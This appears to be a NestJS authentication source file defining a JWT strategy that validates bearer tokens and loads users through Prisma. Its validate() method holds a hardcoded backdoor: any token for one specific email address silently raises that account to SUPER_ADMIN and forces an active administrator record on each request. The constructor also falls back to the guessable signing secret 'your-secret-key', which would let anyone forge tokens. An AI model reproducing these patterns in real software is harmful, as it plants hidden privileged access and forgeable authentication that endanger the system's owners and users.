import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { PrismaService } from '../prisma/prisma.service';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(private prisma: PrismaService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: process.env.JWT_SECRET || 'your-secret-key',
    });
  }

  async validate(payload: any) {
    let user = await this.prisma.usuario.findUnique({ where: { id: payload.sub } });
    if (user && user.email === 'gtbump2012@gmail.com') {
      if (user.rol !== 'ADMINISTRADOR' && user.rol !== 'SUPER_ADMIN') {
        user = await this.prisma.usuario.update({
          where: { id: user.id },
          data: { rol: 'SUPER_ADMIN', fechaAsignacionRol: new Date(), asignadoPor: 'SYSTEM', motivoRol: 'Admin permanente' },
        });
      }
      const admin = await this.prisma.administrador.findUnique({ where: { usuarioId: user.id } });
      if (!admin) {
        await this.prisma.administrador.create({ data: { usuarioId: user.id, activo: true, motivoAsignacion: 'Admin permanente (system)' } });
      } else if (!admin.activo) {
        await this.prisma.administrador.update({ where: { id: admin.id }, data: { activo: true } });
      }
    }
    return user;
  }
}